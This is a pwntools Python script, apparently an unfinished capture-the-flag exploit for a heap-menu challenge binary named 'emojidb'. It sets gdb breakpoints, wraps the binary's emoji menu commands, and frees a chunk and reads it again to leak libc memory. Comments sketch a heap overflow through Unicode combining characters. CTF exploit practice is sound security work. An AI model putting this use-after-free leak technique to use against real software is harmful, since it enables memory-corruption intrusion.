from pwn import *

binpath = './emojidb'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
set $arr=(0x0000555555554000+0x00000000002020A0)
# new
b *(0x0000555555554000+0xd00)
# free
b *(0x0000555555554000+0xea0)
# open book
b *(0x0000555555554000+0xe50)

# b *(0x0000555555554000+0xac8)
b *(0x0000555555554000+0xe74)
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


def menu():
    # print(io.recvuntil('🆓'.encode()).decode())
    io.recvuntil('🆓'.encode())
    io.recvuntil("❓".encode())


@debug
def new(size, data):
    menu()
    payload = b''
    payload += "🆕".encode()
    payload += b'%d' % size
    payload += data
    io.sendline(payload)
    io.recvuntil("🆕".encode())


@debug
def free(index):
    menu()
    payload = b''
    payload += '🆓'.encode()
    payload += b"%d" % index
    io.sendline(payload)
    io.recvuntil("🆕".encode())


@debug
def open_book(index):
    menu()
    payload = b''
    payload += "📖".encode()
    payload += b"%d" % index
    io.sendline(payload)
    print(hexdump(io.recvuntil("❓".encode())))
    print(hexdump(io.recvuntil("❓".encode())))
    # data = io.recvline()
    # data = io.recv(1024)
    data = io.recvuntil("🆕".encode())
    return data[:-4]

# use Unicod combined character (e.g., か゚)
# to cause heap overflow?

# leak libc

# leak heap base

new(0x410 / 4, b'A')  # 1
new(0x28 / 4, b'B')  # 2

free(1)

data = open_book(1)
print("data")
print(data)
print(hexdump(data))
try:
    print(data.decode())
except UnicodeDecodeError:
    print("Check")

# new(0x100, 'か゚'.encode())

io.interactive()
